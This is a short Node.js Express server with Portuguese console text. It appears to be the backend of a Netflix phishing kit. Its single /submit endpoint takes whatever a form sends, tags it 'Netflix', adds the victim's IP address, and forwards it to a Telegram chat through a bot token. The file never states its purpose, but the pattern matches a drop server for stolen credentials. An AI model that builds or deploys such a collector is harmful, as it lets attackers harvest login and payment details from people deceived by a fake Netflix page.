const express = require("express");
const dotenv = require("dotenv");
const axios = require("axios");
const cors = require("cors");
dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

app.post("/submit", (req, res) => {
  const message = req.body.content;

  axios
    .post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: `Netflix\n\n${message}\nIP: ${req.ip}`,
      }
    )
    .then(() => {
      res.status(200).json({ success: true });
    })
    .catch((error) => {
      console.error(error);
      res.status(500).json({ success: false });
    });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`API rodando na porta ${port}!`);
});
